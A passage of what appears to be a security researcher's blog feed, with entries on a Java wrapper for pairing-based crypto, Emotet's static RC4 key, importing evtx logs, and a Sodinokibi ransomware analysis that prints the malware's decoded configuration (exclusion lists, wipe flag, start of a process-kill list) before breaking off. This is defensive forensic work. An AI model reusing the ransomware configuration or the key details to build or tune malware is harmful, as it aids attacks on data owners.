<p>My starting point is the <strong>PBC Library</strong> <a href="https://crypto.stanford.edu/pbc/" target="_blank" rel="noopener noreferrer">https://crypto.stanford.edu/pbc/</a> which was written by Ben Lynn as part of his PhD thesis. To use this in a prototyping project, we had to transmit encrypted content and key material from one computer to another. So we needed a machine-independant representation of all of the data, which was not subject of <strong>PBC Library</strong>. So, we wrapped all the data structures used in <strong>PBC Library</strong> by C++-based structures. After this, it was possible to easily export and import cryptographic data using</p>
<ul>
<li>any data format, such as JSON, ASN.1, XML, ...</li>
<li>any other PBC library (lower case L).</li>
</ul>
<p>Our next challenge was to make the C++ library accessible for higher level languages, such as Java (required for Android devices as well as Java Backends) or Swift (required for iOS devices). As of today, we succeeded. The following is running:</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package com.company;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import com.tsystems_mms.je2ee.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Main {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    static {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.loadLibrary("je2ee");</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private static final char[] HEX_ARRAY = "0123456789ABCDEF".toCharArray();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static String bytesToHex(byte[] bytes) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        char[] hexChars = new char[bytes.length * 2];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        for (int j = 0; j &lt; bytes.length; j++) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            int v = bytes[j] &amp; 0xFF;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            hexChars[j * 2] = HEX_ARRAY[v &gt;&gt;&gt; 4];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            hexChars[j * 2 + 1] = HEX_ARRAY[v &amp; 0x0F];</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return new String(hexChars);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        PbcContext context = je2ee.createContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        GlobalParameters global = je2ee.getGlobal(context);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        KeyPair kp = je2ee.createKeyPair(global);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Element dek = je2ee.generateDataEncryptionKey(global);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] aesKey1 = je2ee.kdf256(dek);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Tuple ciphertext = je2ee.encryptFirstLevel(je2ee.publicKey(kp), dek);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Element decryptedDek = je2ee</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .decryptFirstLevel(je2ee.secretKey(kp), ciphertext);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        byte[] aesKey2 = je2ee.kdf256(decryptedDek);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String aes1 = bytesToHex(aesKey1);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String aes2 = bytesToHex(aesKey2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        assert aes1.equals(aes2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(aes2);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h1>Where can I get the code?</h1>
<p>You need to recursively clone the following repo: <a href="https://github.com/T-Systems-MMS/libe2ee" target="_blank" rel="noopener noreferrer">https://github.com/T-Systems-MMS/libe2ee</a></p>
<h1>Can I use this for my project?</h1>
<p>Yes, you can, but <strong>YOU SHOULDN'T</strong>! This project is a prototype and is only made to show what's possible. Neither <strong>PBC Library</strong> nor this very project has been checked thoroughly by cryptography experts. I do not give any guarantee that this code is secure against any attacks. Maybe if someone is willing to pay for it, it may be possible to raise this code to production level. Until then, this is only a freetime project of myself.</p>
<h1>Some insights...</h1>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="example-of-a-public-key-in-machine-independent-format">Example of a public key in machine independent format<a class="hash-link" aria-label="Direct link to Example of a public key in machine independent format" title="Direct link to Example of a public key in machine independent format" href="https://janstarke.github.io/blog/2021/02/05/Using_pairing_based_cryptography_in_Java#example-of-a-public-key-in-machine-independent-format">​</a></h2>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "root": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "a990af45-2269-537b-95c0-2d1815c6bddb",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "element"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "a990af45-2269-537b-95c0-2d1815c6bddb": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "element",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "a990af45-2269-537b-95c0-2d1815c6bddb",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "field": "3709e538-b580-5e21-a2ae-333585123e35",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "y": "d5TgGd3TwTiVhhdZpQ6L0BS5YqdzIxQVK4ZTPANMqNVvCo1qdeKSz2HZnPKqM9mazGKGZcwG9toinepFSmMvcf",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "x": "AiblhfGZ24J3IA1MNyfKaV3HGMHyCIngbR2sU9D5QyZc5IJV8yxXUGQpbiGBQ3I8N8DXgHQ1dSOKYilloO5BOq"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "3709e538-b580-5e21-a2ae-333585123e35": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "field",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "subtype": "curve",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "3709e538-b580-5e21-a2ae-333585123e35",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "order": "aWgEPTl1tmebfs3ZETd8TJLcWlT",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "pairing": "86ec11e5-802e-5ea0-9cc6-5a429f653359",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "a": "a4cb7d3e-d31e-5472-9928-0b17725c9ae4",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "b": "a47e3ca0-d570-5fe4-bd87-245b0100dbc2",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "cofac": "1iRiNwETOuqBD7ugR7bRatbQL7JDKXfb6QfKFlQdbxb46gQKAjLCS397ZbnU"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "86ec11e5-802e-5ea0-9cc6-5a429f653359": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "pairing",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "86ec11e5-802e-5ea0-9cc6-5a429f653359",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "G1": "3709e538-b580-5e21-a2ae-333585123e35",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "G2": "3709e538-b580-5e21-a2ae-333585123e35",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "GT": "6e9b64ba-e391-5c46-a9b9-0527b3c22212",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "Zr": "a6d00cef-ce1b-5410-bd45-41a0058b4540",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "Eq": "3709e538-b580-5e21-a2ae-333585123e35",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "Fq": "49f4d9d3-3110-5d68-a069-d035ef71b54b",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "Fq2": "df25d091-9992-5b89-9ab7-487678fbd9d3",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "r": "aWgEPTl1tmebfs3ZETd8TJLcWlT",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "phikonr": "1iRiNwETOuqBD7ugR7bRatbQL7JDKXfb6QfKFlQdbxb46gQKAjLCS397ZbnU"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "6e9b64ba-e391-5c46-a9b9-0527b3c22212": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "field",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "subtype": "mulg",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "6e9b64ba-e391-5c46-a9b9-0527b3c22212",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "order": "aWgEPTl1tmebfs3ZETd8TJLcWlT",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "pairing": "86ec11e5-802e-5ea0-9cc6-5a429f653359",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "base": "df25d091-9992-5b89-9ab7-487678fbd9d3"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "df25d091-9992-5b89-9ab7-487678fbd9d3": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "field",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "subtype": "fi",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "df25d091-9992-5b89-9ab7-487678fbd9d3",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "order": "11QugYb4N8ouqquotyF8IDXtacHwMTbO0nzw4DSKv860wA8OmQwaM5NwQDuGzdsaq7qNH2vjKAZYuuiiAkgzugeZZJGzPCyBalRcL5Un43QnC77oOh4PwFfDudE7kPVfi9kMYY9ETj6JjicbhyWKqsrYaU4WMTQfwjMsA1IwD08m1",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "pairing": "86ec11e5-802e-5ea0-9cc6-5a429f653359",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "base": "49f4d9d3-3110-5d68-a069-d035ef71b54b"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "49f4d9d3-3110-5d68-a069-d035ef71b54b": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "field",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "subtype": "montfp",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "49f4d9d3-3110-5d68-a069-d035ef71b54b",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "order": "10iCaKEy0HbDHT6PP7xruLvQ6exXF4OXOWMsLG1cWzUGqHPKb3iHXFPHp5i6InsKwpSoCRA0udlrariW7VXEft1",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "modulus": "10iCaKEy0HbDHT6PP7xruLvQ6exXF4OXOWMsLG1cWzUGqHPKb3iHXFPHp5i6InsKwpSoCRA0udlrariW7VXEft1",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "negpinv": "KdbJ0wZgOLZ",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "R": "Y3IcJ7iNkOkQg5TzeRWCJ5hLYyIjT6hZsVtkHTRaFzT7sr2lxvr37CT7VuW77EbDxq0kazOYLhOdzC31vZhUzz",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "R3": "ebReJS6QeiIxqNFKFf4H01oKlyOviNcOAYf0Ksc4DVIJ8Uk1AxsCiwdUCbzMFFEwkBwtsN5OHZ7ThgIxHNwAq8"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "a6d00cef-ce1b-5410-bd45-41a0058b4540": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "field",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "subtype": "montfp",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "a6d00cef-ce1b-5410-bd45-41a0058b4540",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "order": "aWgEPTl1tmebfs3ZETd8TJLcWlT",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "modulus": "aWgEPTl1tmebfs3ZETd8TJLcWlT",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "negpinv": "1",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "R": "01lnGH9GscRlVEuYE2YC",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "R3": "2HXdeLEYzbwUJfGOVzp6EZRig0e"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "a4cb7d3e-d31e-5472-9928-0b17725c9ae4": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "element",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "a4cb7d3e-d31e-5472-9928-0b17725c9ae4",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "field": "49f4d9d3-3110-5d68-a069-d035ef71b54b",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "x": "1"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    "a47e3ca0-d570-5fe4-bd87-245b0100dbc2": {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "type": "element",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "id": "a47e3ca0-d570-5fe4-bd87-245b0100dbc2",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "field": "49f4d9d3-3110-5d68-a069-d035ef71b54b",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        "x": "0"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Some emotet variants use bad crypto (in the first stage)]]></title>
        <id>https://janstarke.github.io/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage</id>
        <link href="https://janstarke.github.io/blog/2021/01/25/some-emotet-variants-use-bad-crypto-in-the-first-stage"/>
        <updated>2021-01-25T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[What can I say? I recently analyzed an emotet variant which I found in a customer network. Eventually, I found that a new PE binary was being encrypted and loaded into memory. As encryption, simple RC4 was being used, with a static key @nw<jss6fG3Na4jvh^c&4Cgp$*rZ<g?TD@%FgTnwg3, hashed with MD5, which results in 21755ce816bd55c92f57eb4fd2060197 as RC4 key.]]></summary>
        <content type="html"><![CDATA[<p>What can I say? I recently analyzed an emotet variant which I found in a customer network. Eventually, I found that a new PE binary was being encrypted and loaded into memory. As encryption, simple RC4 was being used, with a static key <code>@nw&lt;jss6fG3Na4jvh^c&amp;4Cgp$*rZ&lt;g?TD@%FgTnwg3</code>, hashed with MD5, which results in <code>21755ce816bd55c92f57eb4fd2060197</code> as RC4 key.</p>
<p><a href="https://janstarke.github.io/assets/files/key_generation-1c02fb41dce81ad838cecaed6063778b.png" target="_blank"><img decoding="async" loading="lazy" src="https://janstarke.github.io/assets/images/key_generation-1c02fb41dce81ad838cecaed6063778b.png" width="3360" height="2020" class="img_ev3q"></a></p>
<p>Fortunately, it was not necessary to do the decryption on my own. I could simply set a breakpoint after 0x100013B5 and could read the resulting plaintext PE image.</p>
<p>I instantly uploaded it to <a href="https://www.virustotal.com/gui/file/f6d224a8af3d56e8d17ccea43a8ac6791e658b656e481630a770716b6116fc0c/detection" target="_blank" rel="noopener noreferrer">https://www.virustotal.com/gui/file/f6d224a8af3d56e8d17ccea43a8ac6791e658b656e481630a770716b6116fc0c/detection</a></p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
        <category label="forensics" term="forensics"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Importing Windows Event Logs into Elasticsearch]]></title>
        <id>https://janstarke.github.io/blog/2021/01/01/importing-windows-event-logs-into-elasticsearch</id>
        <link href="https://janstarke.github.io/blog/2021/01/01/importing-windows-event-logs-into-elasticsearch"/>
        <updated>2021-01-01T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Historically, there were two options to import Windows Event Logs into Elasticsearch:]]></summary>
        <content type="html"><![CDATA[<p>Historically, there were two options to import Windows Event Logs into Elasticsearch:</p>
<ul>
<li>using Winlogbeat, which requires a running Windows machine</li>
<li>using plaso, which works only with complete images, but not with triage data, such as some <code>evtx</code> files. Additionally, plaso doesn't soupport elasticsearch 7 or above, so this is not an option.</li>
</ul>
<p>As a result, I decided to implement a script which imports a bunch of <code>evtx</code> files into an elasticsearch index:</p>
<p><a href="https://github.com/teeshop/evtxtools" target="_blank" rel="noopener noreferrer">https://github.com/teeshop/evtxtools</a></p>
<p>At the moment, you need to create an own index template to make sure that all <code>event_data</code> fields are imported as <code>text</code>: No index template is required anymore.</p>]]></content>
        <author>
            <name>Jan Starke</name>
            <uri>https://github.com/janstarke</uri>
        </author>
    </entry>
    <entry>
        <title type="html"><![CDATA[Does Sodinokibi use bad crypto?]]></title>
        <id>https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto</id>
        <link href="https://janstarke.github.io/blog/2020/01/08/does-sodinokibi-use-bad-crypto"/>
        <updated>2020-01-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[During the last days I was able to analyze a sample of the Sodinokibi ransomware (9fde430060112b2ebe83536cfd9de49d0cda04be1e7d83d848fbf68b30855fde).]]></summary>
        <content type="html"><![CDATA[<p>During the last days I was able to analyze a sample of the Sodinokibi ransomware (9fde430060112b2ebe83536cfd9de49d0cda04be1e7d83d848fbf68b30855fde).</p>
<p>During the dynamic investigation I discovered that the malware contains a PE section named <code>.lfge4i</code>. The content of this section is being decoded during execution and contains the following content (I formatted it to improve readability):</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"> {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "pk":"3sB5vqBW0kuO3Nr56Ql+TMjaDchoEjxcKxBA/XbSJks=",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "pid":"48",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "sub":"2360",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "dbg":false,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "fast":false,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "wipe":true,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "wht":{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "fld":[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "$windows.~bt",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "program files",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "google",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "program files (x86)",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "boot",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "msocache",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "system volume information",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "mozilla",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "application data",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "appdata",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "perflogs",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "tor browser",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "programdata",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "windows",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "$recycle.bin",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "$windows.~ws",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "windows.old",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "intel"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "fls":[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "iconcache.db",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "bootfont.bin",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "bootsect.bak",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "thumbs.db",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ntuser.ini",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ntldr",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "autorun.inf",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "boot.ini",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ntuser.dat",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "desktop.ini",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ntuser.dat.log"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "ext":[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "com",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "bat",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "cur",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "scr",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "diagpkg",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "lnk",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "icl",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "diagcfg",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "lock",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "msc",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "msu",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ani",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "cpl",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "386",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "hta",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "cmd",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ocx",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "shs",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "hlp",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "exe",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ico",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "nls",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "adv",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "bin",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "icns",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "theme",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "drv",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "wpx",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "spl",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "cab",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "msstyles",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "sys",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "msi",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "themepack",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "msp",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "mpa",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "deskthemepack",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "key",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "idx",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "mod",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "rom",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "prf",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "nomedia",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "dll",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "diagcab",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ps1",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ics",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "rtp",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         "ldf"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   },</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "wfld":[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "backup"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   ],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   "prc":[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "xfssvccon",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "thebat",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "firefox",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "dbsnmp",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "synctime",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "mydesktopqos",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "msaccess",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "outlook",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      "tbirdconfig",</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      